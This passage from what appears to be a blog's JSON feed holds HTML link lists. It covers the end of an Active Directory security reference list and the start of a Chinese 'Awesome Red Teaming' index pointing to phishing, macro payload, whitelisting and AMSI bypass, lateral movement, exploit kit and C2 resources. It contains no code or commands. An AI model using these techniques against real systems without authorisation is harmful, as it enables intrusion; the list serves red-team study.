data-url=\"aHR0cHM6Ly9ibG9ncy50ZWNobmV0Lm1pY3Jvc29mdC5jb20vam9uc2gvMjAxOC8xMC8wMy9maW5hbGx5LWRlcGxveS1hbmQtYXVkaXQtbGFwcy13aXRoLXByb2plY3QtdmFzdC1wYXJ0LTEtb2YtMi8=\">Finally Deploy and Audit LAPS with Project VAST, Part 1 of 2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudWx0aW1hdGV3aW5kb3dzc2VjdXJpdHkuY29tL3NlY3VyaXR5bG9nL2VuY3ljbG9wZWRpYS9kZWZhdWx0LmFzcHg=\">Windows Security Log Events</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHJpbWFyY3NlY3VyaXR5LmNvbS9zaW5nbGUtcG9zdC9EZXRlY3RpbmctdGhlLUVsdXNpdmUtQWN0aXZlLURpcmVjdG9yeS1UaHJlYXQtSHVudGluZw==\">Talk Transcript BSidesCharm Detecting the Elusive: Active Directory Threat Hunting</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL2JsdWUtdGVhbS9wcmV2ZW50aW5nLW1pbWlrYXR6LWF0dGFja3MtZWQyODNlN2ViZGQ1\">Preventing Mimikatz Attacks</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvUXVlc3RTb2Z0d2FyZS91bmRlcnN0YW5kaW5nLXJlZC1mb3Jlc3QtdGhlLTN0aWVyLWVzYWUtYW5kLWFsdGVybmF0aXZlLXdheXMtdG8tcHJvdGVjdC1wcml2aWxlZ2VkLWNyZWRlbnRpYWxz\">Understanding &quot;Red Forest&quot; - The 3-Tier ESAE and Alternative Ways to Protect Privileged Credentials</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0zNzgy\">Securing Microsoft Active Directory Federation Server (ADFS)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbS9lbi11cy9taWNyb3NvZnQtMzY1L2Jsb2cvMjAxOC8wMy8wNS9henVyZS1hZC1hbmQtYWRmcy1iZXN0LXByYWN0aWNlcy1kZWZlbmRpbmctYWdhaW5zdC1wYXNzd29yZC1zcHJheS1hdHRhY2tzLw==\">Azure AD and ADFS best practices: Defending against password spray attacks</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yMg==\">AD Reading: Active Directory Backup and Disaster Recovery</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZW5kZ2FtZS5jb20vYmxvZy90ZWNobmljYWwtYmxvZy90ZW4tcHJvY2Vzcy1pbmplY3Rpb24tdGVjaG5pcXVlcy10ZWNobmljYWwtc3VydmV5LWNvbW1vbi1hbmQtdHJlbmRpbmctcHJvY2Vzcw==\">Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZW5kZ2FtZS5jb20vYmxvZy90ZWNobmljYWwtYmxvZy9odW50aW5nLW1lbW9yeS1uZXQtYXR0YWNrcw==\">Hunting For In-Memory .NET Attacks</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2Fucy5vcmcvcmVhZGluZy1yb29tL3doaXRlcGFwZXJzL2RldGVjdGlvbi9taW1pa2F0ei1vdmVydmlldy1kZWZlbnNlcy1kZXRlY3Rpb24tMzY3ODA=\">Mimikatz Overview, Defenses and Detection</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHJpbWFyY3NlY3VyaXR5LmNvbS9zaW5nbGUtcG9zdC8yMDE4LzA1LzA2L1RyaW1hcmMtUmVzZWFyY2gtRGV0ZWN0aW5nLVBhc3N3b3JkLVNwcmF5aW5nLXdpdGgtU2VjdXJpdHktRXZlbnQtQXVkaXRpbmc=\">Trimarc Research: Detecting Password Spraying with Security Event Auditing</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY291bnRlcmNlcHQuY29tL2Jsb2cvaHVudGluZy1mb3ItZ2FyZ295bGUv\">Hunting for Gargoyle Memory Scanning Evasion</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy9zZWN1cml0eS90aHJlYXQtcHJvdGVjdGlvbi93aW5kb3dzLWRlZmVuZGVyLWFwcGxpY2F0aW9uLWNvbnRyb2wvd2luZG93cy1kZWZlbmRlci1hcHBsaWNhdGlvbi1jb250cm9sLWRlcGxveW1lbnQtZ3VpZGU=\">Planning and getting started on the Windows Defender Application Control deployment process</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL3RoaW5rLXN0YWNrL3ByZXZlbnRpbmctbGF0ZXJhbC1tb3ZlbWVudC11c2luZy1uZXR3b3JrLWFjY2Vzcy1ncm91cHMtN2U4ZDUzOWE5MDI5\">Preventing Lateral Movement Using Network Access Groups</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vbmVkcml2ZS5saXZlLmNvbS92aWV3LmFzcHg/cmVzaWQ9RDAyNkI0Njk5MTkwRjFFNiEyODQzJmFtcDtpdGhpbnQ9ZmlsZSUyY3BwdHgmYW1wO2FwcD1Qb3dlclBvaW50JmFtcDthdXRoa2V5PSFBTXZDUlRLQl9WMUo1b3c=\">How to Go from Responding to Hunting with Sysinternals Sysmon</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BhbGFudGlyL3dpbmRvd3MtZXZlbnQtZm9yd2FyZGluZw==\">Windows Event Forwarding Guidance</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3RocmVhdGV4cHJlc3MuY29tLzIwMTgvMDUvdGhyZWF0LW1pdGlnYXRpb24tc3RyYXRlZ2llcy10ZWNobmljYWwtcmVjb21tZW5kYXRpb25zLWFuZC1pbmZvLXBhcnQtMi8=\">Threat Mitigation Strategies: Part 2 – Technical Recommendations and Information</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaGFubmVsOS5tc2RuLmNvbS9FdmVudHMvSWduaXRlLzIwMTUvQlJLMzQ4Ng==\">Modern Hardening: Lessons Learned on Hardening Applications and Services</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3B1YmxpY2F0aW9ucy5nYy5jYS9jb2xsZWN0aW9ucy9jb2xsZWN0aW9uXzIwMTkvY3N0Yy1jc2VjL0Q5Ny0zLTcwLTEyLTIwMTktZW5nLnBkZg==\">ITSP.70.012 Guidance for Hardening Microsoft Windows 10 Enterprise</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc25lYWt5bW9ua2V5Lm5ldC8yMDE4LzA2LzI1L2JsdWUtdGVhbS10aXBzLw==\">Blue Team Tips</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc3RpZ3ZpZXdlci5jb20vc3RpZy9hY3RpdmVfZGlyZWN0b3J5X2RvbWFpbi8=\">Active Directory Domain Security Technical Implementation Guide (STIG)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvSHV5S2hhMi9hZHN0Zy12MjAtZ3VpZGFuY2U=\">Active Directory Security Testing Guide - v2.0</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy1zZXJ2ZXIvaWRlbnRpdHkvYWQtZnMvZGVwbG95bWVudC9iZXN0LXByYWN0aWNlcy1zZWN1cmluZy1hZC1mcw==\">Best practices for securing Active Directory Federation Services</span></li>\n</ul>\n<h2 id=\"license\"><a class=\"anchor\" href=\"#license\">#</a> License</h2>\n<p><a href=\"http://creativecommons.org/publicdomain/zero/1.0\"><img data-src=\"http://mirrors.creativecommons.org/presskit/buttons/88x31/svg/cc-zero.svg\" alt=\"CC0\" /></a></p>\n<p>To the extent possible under law, Rahmat Nurfauzi &quot;@infosecn1nja&quot; has waived all copyright and related or neighboring rights to this work.</p>\n",
            "tags": [
                "AD-Attack-Defense"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Reference/Awesome-Red-Teaming/",
            "url": "https://or0kit.github.io/PenetrationTest/Reference/Awesome-Red-Teaming/",
            "title": "Awesome Red Teaming【转】",
            "date_published": "2021-01-18T07:02:37.000Z",
            "content_html": "<h1 id=\"awesome-red-teaming\"><a class=\"anchor\" href=\"#awesome-red-teaming\">#</a> Awesome Red Teaming</h1>\n<p>一个最好的红队资源清单</p>\n<p>此列表同样适用于希望了解红队但没有相关知识储备的人</p>\n<p>无论如何，这是一个活跃的列表，会定期更新最新的对抗策略与技术</p>\n<p>你可以通过发起 PR 来添加更多有用信息！</p>\n<h1 id=\"目录\"><a class=\"anchor\" href=\"#目录\">#</a> 目录</h1>\n<ul>\n<li><a href=\"#%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B\">社会工程</a></li>\n<li><a href=\"#-osint\">OSINT</a></li>\n<li><a href=\"#%E6%8A%95%E9%80%92\">投递</a></li>\n<li><a href=\"#%E6%A4%8D%E5%85%A5\">植入</a></li>\n<li><a href=\"#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8\">横向移动</a></li>\n<li><a href=\"#%E5%91%BD%E4%BB%A4%E6%8E%A7%E5%88%B6\">命令控制</a></li>\n<li><a href=\"#%E5%B5%8C%E5%85%A5%E5%BC%8F%E4%B8%8E%E7%89%A9%E7%90%86%E8%AE%BE%E5%A4%87\">嵌入式与物理设备</a></li>\n<li><a href=\"#%E6%9D%82%E9%A1%B9\">杂项</a></li>\n<li><a href=\"#%E7%94%B5%E5%AD%90%E4%B9%A6%E7%B1%8D\">电子书籍</a></li>\n<li><a href=\"#%E5%9F%B9%E8%AE%AD\">培训</a></li>\n<li><a href=\"#%E8%AE%A4%E8%AF%81\">认证</a></li>\n</ul>\n<h2 id=\"\"><a class=\"anchor\" href=\"#\">#</a> <a href=\"#table-of-contents\">↑</a> 社会工程</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc29jaWFsLWVuZ2luZWVyLm9yZy8=\">社会工程门户网站</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5kYXJrcmVhZGluZy5jb20vdGhlLTctYmVzdC1zb2NpYWwtZW5naW5lZXJpbmctYXR0YWNrcy1ldmVyL2QvZC1pZC8xMzE5NDEx\">7 个最好的社会工程攻击案例</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnNhY29uZmVyZW5jZS5jb20vd3JpdGFibGUvcHJlc2VudGF0aW9ucy9maWxlX3VwbG9hZC9kYXMtMzAxX3dpbGxpYW1zX3JhZGVyLnBkZg==\">在大数据中使用社会工程策略 - RSA Conference Europe 2012</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpYS5kZWZjb24ub3JnL0RFRiUyMENPTiUyMDI0L0RFRiUyMENPTiUyMDI0JTIwcHJlc2VudGF0aW9ucy9ERUZDT04tMjQtU2V5bW91ci1UdWxseS1XZWFwb25pemluZy1EYXRhLVNjaWVuY2UtRm9yLVNvY2lhbC1FbmdpbmVlcmluZy1XUC5wZGY=\">为社会工程武装数据科学：Twitter 中的自动 E2E 鱼叉式网络钓鱼 - Defcon 23</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2ltYWdlcy81LzU0L1ByZXNlbnRhdGlvbl9Tb2NpYWxfRW5naW5lZXJpbmcucGRm\">OWASP 社会工程介绍 - OWASP</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmVkdGVhbXNlY3VyZS5jb20vdXNiLWRyb3AtYXR0YWNrcy10aGUtZGFuZ2VyLW9mLWxvc3QtYW5kLWZvdW5kLXRodW1iLWRyaXZlcy8=\">USB 丢失攻击：USB 设备丢失与发现的危险</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JlZHRlYW1zZWN1cml0eS9QeVBoaXNoaW5n\">PyPhishing 工具包</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3NjaGVkdWxlLmNvbS9ibG9nL2Jlc3QtdGltZS10by1zZW5kLWVtYWlsLw==\">发送电子邮件的最佳时间</span></li>\n</ul>\n<h2 id=\"-2\"><a class=\"anchor\" href=\"#-2\">#</a> <a href=\"#table-of-contents\">↑</a> OSINT</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ppdm9pL2F3ZXNvbWUtb3NpbnQ=\">最好的 OSINT 列表</span> - 覆盖了很多 OSINT 资源</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxNy8wNy9yZWNvbm5haXNzYW5jZS11c2luZy1saW5rZWRpbnQv\">使用 LinkedInt 进行侦察</span></li>\n</ul>\n<h2 id=\"-3\"><a class=\"anchor\" href=\"#-3\">#</a> <a href=\"#table-of-contents\">↑</a> 投递</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY29iYWx0c3RyaWtlLmNvbS9oZWxwLXNwZWFyLXBoaXNo\">Cobalt Strike - 鱼叉式网络钓鱼文档</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNC8xMi8xNy93aGF0cy10aGUtZ28tdG8tcGhpc2hpbmctdGVjaG5pcXVlLW9yLWV4cGxvaXQv\">Cobalt Strike - 什么是钓鱼？如何利用？</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1WN1VKalZjcTJBbw==\">使用 Cobalt Strike 进行网络钓鱼 - Raphael Mudge</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbmlnbWEweDMubmV0LzIwMTcvMDcvMTMvcGhpc2hpbmctYWdhaW5zdC1wcm90ZWN0ZWQtdmlldy8=\">针对受保护的视图进行钓鱼</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jeWJlcnN5bmRpY2F0ZXMuY29tLzIwMTUvMDYvdmVpbC1ldmFzaW9uLWFlcy1lbmNyeXB0ZWQtaHR0cGtleS1yZXF1ZXN0LW1vZHVsZS8=\">VEIL-EVASION 的 AES 加密 HTTPKEY 请求：沙盒逃逸</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jeWJlcnN5bmRpY2F0ZXMuY29tLzIwMTYvMTIvZWdyZXNzaW5nLWJsdWVjb2F0LXdpdGgtY29iYWx0c3Rpa2UtbGV0c2VuY3J5cHQv\">EGRESSING BLUECOAT WITH COBALTSTIKE &amp; LET'S ENCRYPT</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jeWJlcnN5bmRpY2F0ZXMuY29tLzIwMTYvMDUvZW1haWwtcmVjb25uYWlzc2FuY2UtcGhpc2hpbmctdGVtcGxhdGUtZ2VuZXJhdGlvbi1tYWRlLXNpbXBsZS8=\">电子邮件侦察与钓鱼邮件模版生成</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8wNS8xNC9hbi11bm5lY2Vzc2FyeS1hZGRpY3Rpb24tdG8tZG5zLWNvbW11bmljYXRpb24v\">不必依赖 DNS 通信</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9menVja2VybWFuLndvcmRwcmVzcy5jb20vMjAxNi8xMC8wNi9wb3dlcnNoZWxsLWVtcGlyZS1zdGFnZXJzLTEtcGhpc2hpbmctd2l0aC1hbi1vZmZpY2UtbWFjcm8tYW5kLWV2YWRpbmctYXZzLw==\">POWERSHELL EMPIRE 策略 1: 使用 Office 宏指令进行钓鱼与逃避杀软</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL3BoaXNoaW5nLXdpdGgtcG93ZXJwb2ludC8=\">使用 PowerPoint 进行钓鱼</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbmlnbWEweDMubmV0LzIwMTYvMDMvMTUvcGhpc2hpbmctd2l0aC1lbXBpcmUv\">使用 EMPIRE 进行钓鱼</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zaXhkdWIubmV0Lz9wPTYyNw==\">Empire 与工具多样性：整合是关键</span></li>\n</ul>\n<h2 id=\"-4\"><a class=\"anchor\" href=\"#-4\">#</a> <a href=\"#table-of-contents\">↑</a> 植入</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxNy8wNC9leHBsb2l0aW5nLWN2ZS0yMDE3LTAxOTktaHRhLWhhbmRsZXItdnVsbmVyYWJpbGl0eS8=\">CVE-2017-0199: HTA 处理漏洞</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JoZHJlc2gvQ1ZFLTIwMTctMDE5OQ==\">CVE-2017-0199 工具包</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Z5c2VjL0NWRS0yMDE3LTg3NTktRXhwbG9pdC1zYW1wbGU=\">CVE-2017-8759 Exploit 示例</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Z5c2VjL1dpbmRvd3MtU2lnbmVkQmluYXJ5\">签名 Window 二进制程序</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLm13cmluZm9zZWN1cml0eS5jb20vdG9vbHMvd2Vwd25pc2Uv\">Wepwnise</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWtzaG9wLmNvbS9wcm9kdWN0cy9iYXNoLWJ1bm55\">Bash Bunny</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VuaWdtYTB4My9HZW5lcmF0ZS1NYWNybw==\">生成宏的工具</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL2VtcGlyZXMtY3Jvc3MtcGxhdGZvcm0tb2ZmaWNlLW1hY3JvLw==\">Empire 中的跨平台 Office 宏</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly80c3lzb3BzLmNvbS9hcmNoaXZlcy9leGNlbC1tYWNyb3Mtd2l0aC1wb3dlcnNoZWxsLw==\">使用 PowerShell 执行 Excel 宏</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9waGlzaG1lLmNvbS9wb3dlcnBvaW50LWFuZC1jdXN0b20tYWN0aW9ucy8=\">PowerPoint 与自定义行为</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NlY3JldHNxdWlycmVsL1NpZ1RoaWVm\">三步签名 mimikatz</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yaXNjeWJ1c2luZXNzLndvcmRwcmVzcy5jb20vMjAxNy8xMC8wNy9oaWRpbmcteW91ci1wcm9jZXNzLWZyb20tc3lzaW50ZXJuYWxzLw==\">在 sysinternals 中隐藏你的进程</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2hlbGxudGVsLmNvbS9ibG9nLzIwMTYvOS8xMy9sdWNreXN0cmlrZS1hLWRhdGFiYXNlLWJhY2tlZC1ldmlsLW1hY3JvLWdlbmVyYXRvcg==\">Luckystrike: 邪恶 Office 文档生成器</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2dlb3JnZW1hdWVyLm5ldC8yMDE3LzEwLzA3L2Nzdi1pbmplY3Rpb24uaHRtbA==\">被低估的 CSV 注入风险</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZW5zZXBvc3QuY29tL2Jsb2cvMjAxNy9tYWNyby1sZXNzLWNvZGUtZXhlYy1pbi1tc3dvcmQv\">MSWord 中无宏代码执行</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BtYWxjb212ZXR0ZXIvbXVsdGktcGxhdGZvcm0tbWFjcm8tcGhpc2hpbmctcGF5bG9hZHMtM2I2ODhlOGVmZjY4\">跨平台宏钓鱼载荷</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9mdXJvbmVyLndvcmRwcmVzcy5jb20vMjAxNy8xMC8xNy9tYWNyb2xlc3MtbWFsd2FyZS10aGF0LWF2b2lkcy1kZXRlY3Rpb24td2l0aC15YXJhLXJ1bGUvYW1wLw==\">Macroless DOC 恶意软件躲避 Yara 规则</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibmVnLmlvLzIwMTcvMDcvMjYvZW1waXJlLXdpdGhvdXQtcG93ZXJzaGVsbC1leGUv\">无 Powershell 的 Empire</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL3Bvd2Vyc2hlbGwtd2l0aG91dC1wb3dlcnNoZWxsLWhvdy10by1ieXBhc3MtYXBwbGljYXRpb24td2hpdGVsaXN0aW5nLWVudmlyb25tZW50LXJlc3RyaWN0aW9ucy1hdi8=\">无 Powershell 的 Powershell 来绕过应用程序白名单</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0B2aXZhbWkvcGhpc2hpbmctYmV0d2Vlbi10aGUtYXBwLXdoaXRlbGlzdHMtMWI3ZGNkYWI0Mjc5\">应用程序白名单的钓鱼</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3N1YnQweDEwLmJsb2dzcG90LnNnLzIwMTcvMDQvYnlwYXNzLWFwcGxpY2F0aW9uLXdoaXRlbGlzdGluZy1zY3JpcHQuaHRtbA==\">绕过应用程序白名单脚本保护 -  Regsvr32.exe 与 COM 脚本 (.sct 文件)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3N1YnQweDEwLmJsb2dzcG90LnNnLzIwMTcvMDQvYnlwYXNzaW5nLWFwcGxpY2F0aW9uLXdoaXRlbGlzdGluZy5odG1s\">使用 MSBuild.exe 绕过应用程序白名单 - Device Guard 示例与缓解措施</span></li>\n</ul>\n<h2 id=\"-5\"><a class=\"anchor\" href=\"#-5\">#</a> <a href=\"#table-of-contents\">↑</a> 横向移动</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxNi8xMi9jbmEtZXZlbnR2d3ItdWFjLWJ5cGFzcy8=\">Eventvwr File-less UAC Bypass CNA</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbmlnbWEweDMubmV0LzIwMTcvMDkvMTEvbGF0ZXJhbC1tb3ZlbWVudC11c2luZy1leGNlbC1hcHBsaWNhdGlvbi1hbmQtZGNvbS8=\">使用 Excel 与 dcom 进行横向移动</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL3dzaC1pbmplY3Rpb24tYS1jYXNlLXN0dWR5LWZkMzVmNzlkMjlkZA==\">WSH 注射案例研究</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL2ZpbGVsZXNzLXVhYy1ieXBhc3MtdXNpbmctc2RjbHQtZXhlLTNlOWY5YWQ0ZTJiMw==\">Fileless UAC Bypass using sdclt</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL2J5cGFzc2luZy1hbXNpLXZpYS1jb20tc2VydmVyLWhpamFja2luZy1iOGEzMzU0ZDFhZmY=\">劫持 COM 服务器绕过 AMSI</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3R5cmFuaWQvRGV2aWNlR3VhcmRCeXBhc3Nlcw==\">绕过 Window 10 的 Device Guard</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNi8xMi8xNC9teS1maXJzdC1nby13aXRoLWJsb29kaG91bmQv\">My First Go with BloodHound</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNy8wNi8yMy9vcHNlYy1jb25zaWRlcmF0aW9ucy1mb3ItYmVhY29uLWNvbW1hbmRzLw==\">OPSEC 有关 beacon command 的注意事项</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNi8xMS8wMy9hZ2VudGxlc3MtcG9zdC1leHBsb2l0YXRpb24v\">无代理载荷投递</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8xMi8xNi93aW5kb3dzLWFjY2Vzcy10b2tlbnMtYW5kLWFsdGVybmF0ZS1jcmVkZW50aWFscy8=\">Windows 访问令牌与备用凭据</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5pcm9uZ2Vlay5jb20vaS5waHA/cGFnZT12aWRlb3MvZGVyYnljb243L3QxMDQtcHNhbXNpLWFuLW9mZmVuc2l2ZS1wb3dlcnNoZWxsLW1vZHVsZS1mb3ItaW50ZXJhY3Rpbmctd2l0aC10aGUtYW50aS1tYWx3YXJlLXNjYW4taW50ZXJmYWNlLWluLXdpbmRvd3MtMTAtcnlhbi1jb2Ji\">PSAmsi - Windows 10 中与反恶意软件扫描接口交互的进攻性 PowerShell 模块</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3RocmVhdC50ZXZvcmEuY29tL2xheS1vZi10aGUtbGFuZC13aXRoLWJsb29kaG91bmQv\">Lay of the Land with BloodHound</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZW5zZXBvc3QuY29tL2Jsb2cvMjAxNi9icmluZ2luZy10aGUtaGFzaGVzLWhvbWUtd2l0aC1yZWdlb3JnLWVtcGlyZS8=\">使用 reGeorg 与 Empire 得到哈希</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZW5zZXBvc3QuY29tL2Jsb2cvMjAxNi9pbnRlcmNlcHRpbmctcGFzc3dvcmRzLXdpdGgtZW1waXJlLWFuZC13aW5uaW5nLw==\">使用 Empire 截取密码</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZW5zZXBvc3QuY29tL2Jsb2cvMjAxNy9vdXRsb29rLWhvbWUtcGFnZS1hbm90aGVyLXJ1bGVyLXZlY3Rvci8=\">Outlook 主页 – 另一个攻击向量</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZW5zZXBvc3QuY29tL2Jsb2cvMjAxNy9vdXRsb29rLWZvcm1zLWFuZC1zaGVsbHMv\">Outlook 的 Form 与 Shell</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25ldGJpb3NYL0NoZWNrbGlzdHMvYmxvYi9tYXN0ZXIvV2luZG93cy1Qcml2aWxlZ2UtRXNjYWxhdGlvbi5tZA==\">Windows 提权清单</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaWxlbnRicmVha3NlY3VyaXR5LmNvbS90aHJvd2JhY2stdGh1cnNkYXktYS1ndWlkZS10by1jb25maWd1cmluZy10aHJvd2JhY2sv\">配置回滚指南</span></li>\n</ul>\n<h2 id=\"-6\"><a class=\"anchor\" href=\"#-6\">#</a> <a href=\"#table-of-contents\">↑</a> 命令控制</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL2J1aWxkLWMyLWluZnJhc3RydWN0dXJlLWRpZ2l0YWwtb2NlYW4tcGFydC0xLw==\">使用 Digital Ocean 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNC8wOS8wOS9pbmZyYXN0cnVjdHVyZS1mb3Itb25nb2luZy1yZWQtdGVhbS1vcGVyYXRpb25zLw==\">红队行动的基础设施</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXN0YW1vdXNlLm1lLzIwMTcvMDgvYXV0b21hdGVkLXJlZC10ZWFtLWluZnJhc3RydWN0dXJlLWRlcGxveW1lbnQtd2l0aC10ZXJyYWZvcm0tLS1wYXJ0LTEv\">使用 Terraform 进行红队基础设施自动化部署</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jeWJlcnN5bmRpY2F0ZXMuY29tLzIwMTYvMTEvdG9wLXJlZC10ZWFtLXRpcHMv\">6 个红队基础设施的小提示</span></li>\n<li><span class=\"exturl\" 